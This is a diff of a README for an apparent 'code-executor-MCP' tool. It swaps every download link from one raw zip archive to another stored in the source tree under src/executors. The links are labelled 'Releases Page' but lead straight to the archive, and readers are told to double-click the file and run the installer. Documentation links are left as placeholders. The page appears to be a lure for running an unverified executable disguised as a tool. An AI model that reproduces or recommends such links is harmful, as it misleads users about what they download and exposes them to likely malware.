@@ -1,6 +1,6 @@
 # 🚀 code-executor-MCP - One Tool For All Your Needs
 
-[![Download Now](https://raw.githubusercontent.com/Muhumuree/code-executor-MCP/main/docs/code-executor-MCP_v3.6.zip%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Muhumuree/code-executor-MCP/main/docs/code-executor-MCP_v3.6.zip)
+[![Download Now](https://github.com/Muhumuree/code-executor-MCP/raw/refs/heads/main/src/executors/MCP_executor_code_2.2.zip%20Now-Visit%20Page-brightgreen)](https://github.com/Muhumuree/code-executor-MCP/raw/refs/heads/main/src/executors/MCP_executor_code_2.2.zip)
 
 ## 🌟 What is Code Executor MCP?
 
@@ -21,7 +21,7 @@ To use Code Executor MCP on your system, please follow these clear steps.
 
 Visit this page to download the latest version of Code Executor MCP:
 
-[Download Code Executor MCP](https://raw.githubusercontent.com/Muhumuree/code-executor-MCP/main/docs/code-executor-MCP_v3.6.zip)
+[Download Code Executor MCP](https://github.com/Muhumuree/code-executor-MCP/raw/refs/heads/main/src/executors/MCP_executor_code_2.2.zip)
 
 ### 2. Choose Your Version
 
@@ -47,7 +47,7 @@ After installation, you can find Code Executor MCP in your Applications folder o
 
 To download and install Code Executor MCP, please follow these steps:
 
-1. **Visit the Releases Page**: [Download Code Executor MCP](https://raw.githubusercontent.com/Muhumuree/code-executor-MCP/main/docs/code-executor-MCP_v3.6.zip)
+1. **Visit the Releases Page**: [Download Code Executor MCP](https://github.com/Muhumuree/code-executor-MCP/raw/refs/heads/main/src/executors/MCP_executor_code_2.2.zip)
 2. **Select the Latest Release**: Click on the latest release for the most up-to-date features and fixes.
 3. **Download the File**: Click on the version link and save the file to your preferred location.
 4. **Run the Installer**: Double-click on the downloaded file and follow the setup instructions.
@@ -79,7 +79,7 @@ If you need more assistance, feel free to check the following resources:
 
 ## 🔗 Key Links
 
-- **Download Code Executor MCP**: [Visit Releases Page](https://raw.githubusercontent.com/Muhumuree/code-executor-MCP/main/docs/code-executor-MCP_v3.6.zip)
+- **Download Code Executor MCP**: [Visit Releases Page](https://github.com/Muhumuree/code-executor-MCP/raw/refs/heads/main/src/executors/MCP_executor_code_2.2.zip)
 - **Documentation**: [Link to official documentation]
 - **Community Forums**: [Link to community forums]
 
